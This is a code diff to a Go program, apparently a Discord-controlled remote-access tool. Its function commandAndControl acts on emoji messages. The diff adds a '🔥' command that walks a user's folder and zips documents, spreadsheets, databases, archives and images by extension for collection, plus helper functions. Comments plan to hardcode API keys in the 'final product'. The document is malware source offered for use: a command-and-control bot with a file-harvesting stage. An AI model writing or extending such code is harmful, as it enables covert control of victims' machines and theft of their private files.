@@ -1,10 +1,12 @@
 package main
 
 import (
+	"archive/zip"
 	"bufio" //TODO Delete in final product as API keys will be hardcoded, not loaded from .env as in my example
 	"bytes"
 	"fmt"
 	"io"
+	"io/fs"
 	"log" // TODO Delete later
 	"mime/multipart"
 	"net"
@@ -12,6 +14,7 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
+	"path/filepath"
 	"runtime"
 	"strings"
 
@@ -212,11 +215,51 @@ func commandAndControl(session *discordgo.Session, message *discordgo.MessageCre
 		session.ChannelMessageSendReply(message.ChannelID, string(responseBody), message.Reference())
 
 		flag = 1
+	} else if message.Content == "🔥" {
+		zipFile, err := os.Create("files.zip")
+		if err != nil {
+			session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
+			goto end
+		}
+		defer zipFile.Close()
+
+		filepaths := []string{}
+
+		zipWriter := zip.NewWriter(zipFile)
+		defer zipWriter.Close()
+
+		err = filepath.Walk("/mnt/c/Users/julko/Desktop/Škola/", func(path string, fileinfo fs.FileInfo, err error) error {
+			var validExtensions = []string{".csv", ".doc", ".iso", ".jpg", ".odp", ".ods", ".odt", ".pdf", ".ppt", ".rar", ".sql", ".tar", ".xls", ".zip"}
+
+			if err != nil || fileinfo == nil || fileinfo.IsDir() {
+				return nil
+			}
+			fileExtension := strings.ToLower(filepath.Ext(fileinfo.Name()))
+			if contains(&validExtensions, fileExtension) {
+				filepaths = append(filepaths, path)
+			}
+			return nil
+
+		})
+		if err != nil {
+			session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
+			goto end
+		}
+		for _, file := range filepaths {
+			err := addFileToZip(zipWriter, file)
+			if err != nil {
+				session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
+				goto end
+			}
+		}
+		session.ChannelMessageSendReply(message.ChannelID, "Zip created successfully", message.Reference())
+
+		flag = 1
 	} else if message.Content == "💀" {
 		flag = 2
 	}
 
-	end:
+end:
 	session.MessageReactionRemove(message.ChannelID, message.ID, "🕐", "@me")
 	if flag > 0 {
 		session.MessageReactionAdd(message.ChannelID, message.ID, "✅")
@@ -225,6 +268,33 @@ func commandAndControl(session *discordgo.Session, message *discordgo.MessageCre
 			os.Exit(0)
 		}
 	}
+}
+func addFileToZip(zipWriter *zip.Writer, filePath string) error {
+	file, err := os.Open(filePath)
+	if err != nil {
+		return fmt.Errorf("error opening file %s: %v", filePath, err)
+	}
+	defer file.Close()
+
+	zipFileWriter, err := zipWriter.Create(filepath.Base(filePath))
+	if err != nil {
+		return fmt.Errorf("error creating ZIP entry for file %s: %v", filePath, err)
+	}
+
+	_, err = io.Copy(zipFileWriter, file)
+	if err != nil {
+		return fmt.Errorf("error copying file contents to ZIP: %v", err)
+	}
+
+	return nil
+}
+func contains(slice *[]string, str string) bool {
+	for _, item := range *slice {
+		if item == str {
+			return true
+		}
+	}
+	return false
 }
 func discordBot(token string) {
 	bot, err := discordgo.New(fmt.Sprint("Bot ", token))
